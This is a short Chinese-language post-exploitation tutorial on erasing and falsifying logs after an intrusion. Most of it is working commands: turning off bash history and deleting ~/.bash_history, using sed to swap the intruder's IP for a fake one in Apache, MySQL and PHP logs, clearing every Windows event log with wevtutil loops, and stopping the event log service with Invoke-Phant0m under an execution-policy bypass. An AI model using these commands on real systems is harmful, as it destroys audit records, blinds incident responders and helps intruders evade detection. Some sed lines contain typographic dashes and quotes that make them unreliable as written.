---
title: 【后渗透】日志处理
---
# 日志处理
# Linux日志处理

## Bash日志处理

**bash去掉history记录，让系统不记录history**

```bash
export HISTSIZE=0
export HISTFILE=/dev/null
```

history命令的清除，也是对~/.bash_history进行定向清除

```bash
history
rm -rf ~/.bash_history
```

## Web日志处理

如apache的access.log,error.log。

直接将日志清除过于明显,一般使用sed进行定向清除或伪造

```bash
sed –i ‘s/192.168.1.3/8.8.8.8/g’ /var/log/apache/access.log
sed –i ‘s/192.168.1.3/8.8.8.8/g’ /var/log/apache/error_log
#其中192.168.1.3是我们的IP，8.8.8.8是我们伪造的IP
```

## syslog处理

```bash
/var/log/wtmp	#永久记录所有用户的登录和注销信息，last查
/var/log/btmp	#记录登录失败的日志，lastb查看
/var/log/secure	#记录如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码
```

## MySQL日志文件

```bash
log-error=/var/log/mysql/mysql_error.log	#错误日志
log=/var/log/mysql/mysql.log			#最好注释掉，会产生大量的日志，包括每一个执行的sql及环境变量的改变等等
log-bin=/var/log/mysql/mysql_bin.log	# 用于备份恢复，或主从复制.这里不涉及。
log-slow-queries=/var/log/mysql/mysql_slow.log	#慢查询日志
log-error=/var/log/mysql/mysqld.log
pid-file=/var/run/mysqld/mysqld.pid

```

```bash
sed –i 's/192.168.1.3/8.8.8.8/g' /var/log/mysql/mysql_error.log
sed –i 's/192.168.1.3/8.8.8.8/g' /var/log/mysql/mysql_slow.log
```

## **php日志处理**

```bash
sed –i 's/192.168.1.3/192.168.1.4/g'/var/log/apache/php_error.log 
```

# Windows日志处理

## 一、wevtutil+for循环清除所有日志

```cmd
for /F "tokens=*" %a in ('wevtutil.exe el') DO wevtutil.exe cl "%a"
```

## 二、 ps批量删日志 

如果弹回来的是一个ps的shell,直接用ps来批量删日志 

```cmd
PS C:\> wevtutil el | Foreach-Object {Write-Host "Clearing $_"; wevtutil cl "$_"}
```

## 三、运行ps脚本

```bash
powershell –exec bypass –Command "& {Import-Module 'C:\Invoke-Phant0m.ps1';Invoke-Phant0m}"
#win日志服务此时就会停止工作了
```
